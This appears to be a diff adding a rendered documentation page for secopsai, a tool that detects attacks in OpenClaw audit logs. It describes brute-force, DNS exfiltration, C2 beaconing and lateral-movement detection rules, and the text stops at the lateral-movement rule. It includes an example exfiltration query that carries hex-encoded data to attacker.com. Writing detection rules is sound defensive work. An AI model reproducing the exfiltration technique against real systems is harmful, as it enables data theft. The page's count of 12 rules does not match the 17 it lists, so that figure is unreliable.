@@ -1,0 +1,1734 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Intelligent attack detection for OpenClaw audit logs">
+      
+      
+      
+        <link rel="canonical" href="https://docs.secopsai.dev/rules-registry/">
+      
+      
+        <link rel="prev" href="../getting-started/">
+      
+      
+        <link rel="next" href="../deployment-guide/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/favicon.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.5">
+    
+    
+      
+        <title>Rules Registry - secopsai</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="pink" data-md-color-accent="pink">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#rules-registry" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="secopsai" class="md-header__button md-logo" aria-label="secopsai" data-md-component="logo">
+      
+  <img src="../assets/favicon.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            secopsai
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Rules Registry
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="pink" data-md-color-accent="pink"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Techris93/secopsai" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Techris93/secopsai
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="secopsai" class="md-nav__button md-logo" aria-label="secopsai" data-md-component="logo">
+      
+  <img src="../assets/favicon.svg" alt="logo">
+
+    </a>
+    secopsai
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Techris93/secopsai" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Techris93/secopsai
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../getting-started/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Getting Started
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rules Registry
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rules Registry
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#baseline-rules-rule-001-to-rule-007" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Baseline Rules (RULE-001 to RULE-007)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Baseline Rules (RULE-001 to RULE-007)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#rule-001-brute-force-t1110" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-001: Brute Force (T1110)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-002-dns-exfiltration-t1048003" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-002: DNS Exfiltration (T1048.003)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-003-c2-beaconing-t1071" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-003: C2 Beaconing (T1071)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-004-lateral-movement-t1021002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-004: Lateral Movement (T1021.002)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-005-powershell-abuse-t1059001" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-005: PowerShell Abuse (T1059.001)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-006-privilege-escalation-t1068" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-006: Privilege Escalation (T1068)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-007-fileless-lolbins-t1218" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-007: Fileless LOLBins (T1218)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#openclaw-rules-rule-101-to-rule-110" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OpenClaw Rules (RULE-101 to RULE-110)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OpenClaw Rules (RULE-101 to RULE-110)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#rule-101-dangerous-exec-t1059" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-101: Dangerous Exec (T1059)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-102-sensitive-config-change-t1528" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-102: Sensitive Config Change (T1528)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-103-skill-source-drift-t1195" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-103: Skill Source Drift (T1195)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-104-policy-denial-churn-t1078" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-104: Policy Denial Churn (T1078)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-105-tool-burst-abuse-t1087" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-105: Tool Burst Abuse (T1087)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-106-pairing-churn-abuse-t1078" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-106: Pairing Churn Abuse (T1078)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-107-subagent-fanout-abuse-t1104" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-107: Subagent Fanout Abuse (T1104)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-108-restart-loop-t1529" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-108: Restart Loop (T1529)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-109-data-exfiltration-t1048" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-109: Data Exfiltration (T1048)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-110-malware-presence-t1204" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-110: Malware Presence (T1204)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#how-to-tune-rules" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How to Tune Rules
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="How to Tune Rules">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#adjust-thresholds" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adjust Thresholds
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#add-new-patterns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Add New Patterns
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-new-rules" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Create New Rules
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#validate-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Validate Changes
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rule-effectiveness" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rule Effectiveness
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Rule Effectiveness">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#by-attack-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        By Attack Type
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#overall" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overall
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../deployment-guide/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Deployment Guide
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../api-reference/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    API Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../BEGINNER-LIVE-GUIDE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Beginner Live Guide
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OpenClaw-Integration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OpenClaw Integration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#baseline-rules-rule-001-to-rule-007" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Baseline Rules (RULE-001 to RULE-007)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Baseline Rules (RULE-001 to RULE-007)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#rule-001-brute-force-t1110" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-001: Brute Force (T1110)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-002-dns-exfiltration-t1048003" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-002: DNS Exfiltration (T1048.003)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-003-c2-beaconing-t1071" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-003: C2 Beaconing (T1071)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-004-lateral-movement-t1021002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-004: Lateral Movement (T1021.002)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-005-powershell-abuse-t1059001" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-005: PowerShell Abuse (T1059.001)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-006-privilege-escalation-t1068" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-006: Privilege Escalation (T1068)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-007-fileless-lolbins-t1218" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-007: Fileless LOLBins (T1218)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#openclaw-rules-rule-101-to-rule-110" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OpenClaw Rules (RULE-101 to RULE-110)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OpenClaw Rules (RULE-101 to RULE-110)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#rule-101-dangerous-exec-t1059" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-101: Dangerous Exec (T1059)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-102-sensitive-config-change-t1528" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-102: Sensitive Config Change (T1528)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-103-skill-source-drift-t1195" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-103: Skill Source Drift (T1195)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-104-policy-denial-churn-t1078" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-104: Policy Denial Churn (T1078)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-105-tool-burst-abuse-t1087" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-105: Tool Burst Abuse (T1087)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-106-pairing-churn-abuse-t1078" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-106: Pairing Churn Abuse (T1078)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-107-subagent-fanout-abuse-t1104" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-107: Subagent Fanout Abuse (T1104)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-108-restart-loop-t1529" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-108: Restart Loop (T1529)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-109-data-exfiltration-t1048" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-109: Data Exfiltration (T1048)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule-110-malware-presence-t1204" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RULE-110: Malware Presence (T1204)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#how-to-tune-rules" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How to Tune Rules
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="How to Tune Rules">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#adjust-thresholds" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adjust Thresholds
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#add-new-patterns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Add New Patterns
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-new-rules" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Create New Rules
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#validate-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Validate Changes
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rule-effectiveness" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rule Effectiveness
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Rule Effectiveness">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#by-attack-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        By Attack Type
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#overall" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overall
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="rules-registry">Rules Registry</h1>
+<p>Complete reference for all 12 detection rules in secopsai.</p>
+<h2 id="overview">Overview</h2>
+<p>The detection pipeline includes rules organized by framework:</p>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Rules</th>
+<th>Focus</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Baseline</strong></td>
+<td>RULE-001 to RULE-007</td>
+<td>General security (T1110-T1218)</td>
+</tr>
+<tr>
+<td><strong>OpenClaw</strong></td>
+<td>RULE-101 to RULE-110</td>
+<td>OpenClaw-specific attacks</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="baseline-rules-rule-001-to-rule-007">Baseline Rules (RULE-001 to RULE-007)</h2>
+<p>These rules detect general attack patterns applicable to any system.</p>
+<h3 id="rule-001-brute-force-t1110">RULE-001: Brute Force (T1110)</h3>
+<p><strong>Attack:</strong> Multiple failed authentication attempts</p>
+<p><strong>Pattern:</strong> 10+ failed logins in 5 minute window</p>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>Failed SSH login attempts spike</li>
+<li>Rapid password guessing observed</li>
+<li>Account lockout threshold approached</li>
+</ul>
+<p><strong>Example Events:</strong></p>
+<pre><code class="language-json">{
+  &quot;event_type&quot;: &quot;auth_failure&quot;,
+  &quot;username&quot;: &quot;admin&quot;,
+  &quot;source_ip&quot;: &quot;192.168.1.100&quot;,
+  &quot;failure_count&quot;: 15,
+  &quot;window_minutes&quot;: 5
+}
+</code></pre>
+<p><strong>Severity:</strong> <code>HIGH</code></p>
+<p><strong>Remediation:</strong> Block source IP, reset compromised account passwords</p>
+<hr />
+<h3 id="rule-002-dns-exfiltration-t1048003">RULE-002: DNS Exfiltration (T1048.003)</h3>
+<p><strong>Attack:</strong> Data exfiltration via DNS queries</p>
+<p><strong>Pattern:</strong> DNS queries with unusual patterns, long query names, binary data in labels</p>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>DNS query names contain base64/hex patterns</li>
+<li>Many DNS A/AAAA requests to unique domains</li>
+<li>RFC violations in DNS protocol usage</li>
+</ul>
+<p><strong>Example:</strong></p>
+<pre><code>query: 6162636465666768696a6b6c6d6e6f70.attacker.com
+(hex-encoded data in subdomain)
+</code></pre>
+<p><strong>Severity:</strong> <code>CRITICAL</code> (data loss)</p>
+<p><strong>Remediation:</strong> Review DNS logs, block attacker domain, retrieve exfilt records</p>
+<hr />
+<h3 id="rule-003-c2-beaconing-t1071">RULE-003: C2 Beaconing (T1071)</h3>
+<p><strong>Attack:</strong> Command &amp; control beacon traffic</p>
+<p><strong>Pattern:</strong> Periodic HTTP/HTTPS requests to known C2 infrastructure</p>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>Regular connections to IOC domains</li>
+<li>Consistent intervals with error handling patterns</li>
+<li>Non-standard User-Agent strings</li>
+</ul>
+<p><strong>Severity:</strong> <code>CRITICAL</code> (active compromise)</p>
+<p><strong>Remediation:</strong> Block outbound connections, isolate host, retrieve logs</p>
+<hr />
+<h3 id="rule-004-lateral-movement-t1021002">RULE-004: Lateral Movement (T1021.002)</h3>
+<p><strong>Attack:</strong> Horizontal movement via SMB/PsExec</p>
+<p><strong>Pattern:</strong> Remote file execution via \\server\share paths</p>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>SMB traffic to internal IPs</li>
+<li>PsExec command execution observed</li>
+<li>Lateral tool execution attempts</li>
+</ul>
+<p><strong>Severity:</strong> <code>CRITICAL</code></p>
